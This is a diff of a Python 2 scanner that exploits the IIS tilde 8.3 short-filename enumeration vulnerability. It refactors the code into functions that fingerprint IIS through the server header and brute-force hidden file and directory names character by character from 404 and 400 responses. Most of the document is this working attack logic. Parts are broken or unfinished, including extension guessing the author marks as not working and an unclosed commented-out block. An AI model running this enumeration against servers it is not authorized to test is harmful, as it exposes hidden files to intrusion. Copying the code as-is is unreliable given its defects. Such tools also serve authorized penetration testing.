@@ -24,7 +24,7 @@ headers = { 'User-Agent' : 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; 
 targets = []
 
 # Findings is the list of URLs that may be  `good on the web site
-findings_file =  []		# Files discovered
+findings_file =  {}		# Files discovered
 findings_dir =   [] 	# Directories discovered
 findings_other = []  	# HTTP Response Codes other than 200
 findings_final = []		# Where the guessed files are output
@@ -129,29 +129,19 @@ def searchFileForString(string, file):
 	return matches
 
 
-def main():
-	# Check the User-supplied URL
-	if args.url:
-		response_code = initialCheckUrl(args.url)
-	else:
-		print bcolors.RED + '[!] You need to enter a valid URL for us to test.' + bcolors.ENDC
-		sys.exit()
-
-	if args.v: print bcolors.PURPLE + '[+]  HTTP Response Codes: %s' % response_code + bcolors.ENDC
-
+def checkForTildeVuln(url):
 	# Check if the server is IIS and vuln to tilde directory enumeration
 	# TODO - Need to make this more reliable than just relying on header responses
-	server_header = getWebServerResponse(args.url)
+	server_header = getWebServerResponse(url)
 	if 'IIS' in server_header.headers['server'] or 'icrosoft' in server_header.headers['server']:
 		print bcolors.GREEN + '[+]  The server is reporting that it is IIS (%s).' % server_header.headers['server'] + bcolors.ENDC
 		if '5.' in server_header.headers['server']:
 			check_string = '*~1*'
 		elif '6.' in server_header.headers['server']:
 			check_string = '*~1*/.aspx'
-		else:
-			check_string = '0x00000000'
+		# TODO - Need to implement IIS7 check
 	else:
-		print bcolors.RED + '[!]  Error. Server is not reporting that it is IIS (%s).\n[!]     If you know it is, use the -f flag to force testing and re-run the script.' % server_header + bcolors.ENDC
+		print bcolors.RED + '[!]  Error. Server is not reporting that it is IIS.\n[!]     (Request error: %s)\n[!]     If you know it is, use the -f flag to force testing and re-run the script.' % server_header + bcolors.ENDC
 		sys.exit()
 
 	# Check to see if the server is vulnerable to the tilde vulnerability
@@ -165,20 +155,25 @@ def main():
 		print bcolors.RED + '[!]  Error. Server is not probably NOT vulnerable to the tilde enumeration vulnerability.\n[!]     If you know it is, use the -f flag to force testing and re-run the script.' + bcolors.ENDC
 		sys.exit()
 
-	url = urlparse(args.url)
-	url_good = url.scheme + '://' + url.netloc
+	return check_string
 
+
+def checkEightDotThreeEnum(url, check_string, dir='/'):
 	# Here is where we find the files and dirs using the 404 and 400 errors
+	# If the dir var is not passed then we assume this is the root level of the server
+	findings = {}
+	files = []
+
 	for char in chars:
-		resp = getWebServerResponse(url_good+'/'+char+check_string)
+		resp = getWebServerResponse(url+dir+char+check_string)
 		if resp.code == 404:  # Got the first valid char
 
 
-			'''resp_len = getWebServerResponse(url_good+'/'+char+'%3f'+check_string)
+			'''resp_len = getWebServerResponse(url+dir+char+'%3f'+check_string)
 			if resp_len.code == 404:
-				print 'Another char -> ' + url_good+'/'+char+'%3f'+check_string, resp_len.code
+				print 'Another char -> ' + url+dir+char+'%3f'+check_string, resp_len.code
 			elif resp_len.code == 400:
-				print 'That is long enough -> ' + url_good+'/'+char+'%3f'+check_string, resp_len.code'''
+				print 'That is long enough -> ' + url+dir+char+'%3f'+check_string, resp_len.code'''
 
 		# I think one of the issues is that I'm not checking at each # placeholder for if the file is done
 		# Only the files that make it to the 6th char are added to the list
@@ -187,49 +182,50 @@ def main():
 
 
 			for char2 in chars:
-				resp2 = getWebServerResponse(url_good+'/'+char+char2+check_string)
+				resp2 = getWebServerResponse(url+dir+char+char2+check_string)
 
 				if resp2.code == 404:  # Got the second valid char
 					for char3 in chars:
-						resp3 = getWebServerResponse(url_good+'/'+char+char2+char3+check_string)
+						resp3 = getWebServerResponse(url+dir+char+char2+char3+check_string)
 
 						if resp3.code == 404:  # Got the third valid char
 							for char4 in chars:
-								resp4 = getWebServerResponse(url_good+'/'+char+char2+char3+char4+check_string)
+								resp4 = getWebServerResponse(url+dir+char+char2+char3+char4+check_string)
 
 								if resp4.code == 404:  # Got the fourth valid char
 									for char5 in chars:
-										resp5 = getWebServerResponse(url_good+'/'+char+char2+char3+char4+char5+check_string)
+										resp5 = getWebServerResponse(url+dir+char+char2+char3+char4+char5+check_string)
 
 										if resp5.code == 404:  # Got the fifth valid char
 											for char6 in chars:
-												resp6 = getWebServerResponse(url_good+'/'+char+char2+char3+char4+char5+char6+check_string)
+												resp6 = getWebServerResponse(url+dir+char+char2+char3+char4+char5+char6+check_string)
 
 												if resp6.code == 404:  # Got the sixth valid char
 
 													# Check to see if this is a directory or file
-													resp6_dir = getWebServerResponse(url_good+'/'+char+char2+char3+char4+char5+char6+'~1/.aspx')
+													resp6_dir = getWebServerResponse(url+dir+char+char2+char3+char4+char5+char6+'~1/.aspx')
 													if resp6_dir.code == 404:
 														print bcolors.YELLOW + '[+]  Found a new directory: ' +char+char2+char3+char4+char5+char6 + bcolors.ENDC
 														findings_dir.append(char+char2+char3+char4+char5+char6)
 													else:
 														print bcolors.YELLOW + '[+]  Found a new file: ' +char+char2+char3+char4+char5+char6 + bcolors.ENDC
-														findings_file.append(char+char2+char3+char4+char5+char6)
+														files.append(char+char2+char3+char4+char5+char6)
 
+	findings_file[dir] = files
 
 	#### This extension stuff is not working!!!! ###
 	# Now that we have the file names, we have to find their extensions
 	# Need to check after each to find out if there is another char
-	'''for file in findings_file:
+	for file in findings_file[dir]:
 		print bcolors.GREEN + 'Looking for extensions for %s' % file
 
 		# Check how many chars are in the extension
-		3char_ext = getWebServerResponse(url_good+'/'+file+'~1.%3f%3f%3f/.aspx')
+		Threechar_ext = getWebServerResponse(url+dir+file+'~1.%3f%3f%3f/.aspx')
 
-		if resp1.code == 404:	# At least 1 character in ext
-			resp2 = getWebServerResponse(url_good+'/'+file+'~1.%3f%3f/.aspx')
+		if Threechar_ext.code == 404:	# At least 1 character in ext
+			resp2 = getWebServerResponse(url+dir+file+'~1.%3f%3f/.aspx')
 			if resp2.code == 400:	# At least 2 characters in ext
-				resp3 = getWebServerResponse(url_good+'/'+file+'~1.%3f%3f%3f/.aspx')
+				resp3 = getWebServerResponse(url+dir+file+'~1.%3f%3f%3f/.aspx')
 				if resp3.code == 400:	# At least 3 characters in ext
 					print '    %s has a 3 char extension' % file
 				else:
@@ -241,26 +237,60 @@ def main():
 
 
 
-		for char1 in chars:
-			resp1 = getWebServerResponse(url_good+'/'+file+'~1.'+char1+'/.aspx')
-			print url_good+'/'+file+'~1.'+char1+'/.aspx'
+		'''for char1 in chars:
+			resp1 = getWebServerResponse(url+dir+file+'~1.'+char1+'/.aspx')
+			print url+dir+file+'~1.'+char1+'/.aspx'
 			print char1,resp1.code
 
 
 			if resp1.code == 404:  # Got the first valid char
 				for char2 in chars:
-					resp2 = getWebServerResponse(url_good+'/'+file+'~1.'+char1+char2+'/.aspx')
+					resp2 = getWebServerResponse(url+dir+file+'~1.'+char1+char2+'/.aspx')
 
 					if resp2.code == 404:  # Got the second valid char
 						for char3 in chars:
-							resp3 = getWebServerResponse(url_good+'/'+file+'~1.'+char1+char2+char3+'/.aspx')
+							resp3 = getWebServerResponse(url+dir+file+'~1.'+char1+char2+char3+'/.aspx')
 
 							if resp3.code == 404:  # Got the third valid char
 								print file+' . '+char1+char2+char3'''
 
-	print 'Files: %s' % sorted(findings_file) #debug
-	print 'Dirs: %s' % sorted(findings_dir) #debug
-	print bcolors.GREEN + '[-]  Finished doing the 8.3 enumeration.' + bcolors.ENDC
+	findings['files'] = findings_file
+	findings['dirs'] = sorted(findings_dir)
+	print bcolors.GREEN + '[-]  Finished doing the 8.3 enumeration for %s.' % url + bcolors.ENDC
+	return findings
+
+
+def main():
+	# Check the User-supplied URL
+	if args.url:
+		response_code = initialCheckUrl(args.url)
+	else:
+		print bcolors.RED + '[!] You need to enter a valid URL for us to test.' + bcolors.ENDC
+		sys.exit()
+
+	if args.v: print bcolors.PURPLE + '[+]  HTTP Response Codes: %s' % response_code + bcolors.ENDC
+
+	# Check to see if the remote server is IIS and vulnerable to the Tilde issue
+	check_string = checkForTildeVuln(args.url)
+
+
+	url = urlparse(args.url)
+	url_good = url.scheme + '://' + url.netloc
+
+	# Do the initial search for files in the root of the web server
+	findings = checkEightDotThreeEnum(url_good, check_string)
+
+	print 'Files: %s' % findings['files'] #debug
+	print 'Dirs: %s' %  findings['dirs'] #debug
+
+	# TODO - now that we have all the findings, repeat the above step with any findings that are directories and add those findings to the list
+	# Wait to implement this as we'll have to go through and look up these 6 char words in another wordlist
+	#for dir in findings['dirs']:
+	#	findings = checkEightDotThreeEnum(url_good, check_string, dir)
+
+	sys.exit()
+
+
 
 	# Start the URL requests to the server
 	print bcolors.GREEN + '[-]  Now starting the word guessing using word list calls' + bcolors.ENDC
@@ -400,7 +430,7 @@ def main():
 # Command Line Arguments
 parser = argparse.ArgumentParser(description='Expands the file names found from the tilde enumeration vuln')
 parser.add_argument('-b', action='store_true', default=False, help='brute force backup extension, extensions')
-parser.add_argument('-f', action='store_true', default=False, help='force testing of the server even if the headers do not report it as an IIS system')q
+parser.add_argument('-f', action='store_true', default=False, help='force testing of the server even if the headers do not report it as an IIS system')
 parser.add_argument('-u', dest='url', help='URL to scan')
 parser.add_argument('-v', action='store_true', default=False, help='verbose output')
 parser.add_argument('wordlist', help='the wordlist file')
